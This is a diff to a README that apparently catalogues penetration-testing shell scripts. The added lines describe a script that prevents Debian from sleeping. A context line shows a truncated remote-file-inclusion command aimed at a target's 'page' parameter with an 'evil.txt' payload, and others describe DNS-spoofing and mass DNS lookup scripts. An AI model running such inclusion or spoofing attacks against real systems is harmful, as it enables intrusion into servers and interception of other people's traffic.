@@ -90,6 +90,11 @@ rfi-rce -f /var/www/html/evil.txt -u "http://target-ip/section.php?page=http://a
 ./MountDriveVMWworkstation.sh 
 ```
 
+- __PreventSleeping.sh__ This is a simple script to prevent a Debian based Linux Distro from falling asleep
+```sh
+./PreventSleeping.sh
+```
+
 - __enablespoofing.sh__ This is a simple script meant to take care of the tasks neccessary to allow dns spoofing on Kali Linux. It enables port forwarding on ipv4 and allows DNS traffic.
 
 - __dnslookup.sh__ This command is meant to perform a mas dns lookup based on an IPv4 address range. Returns output in the below format
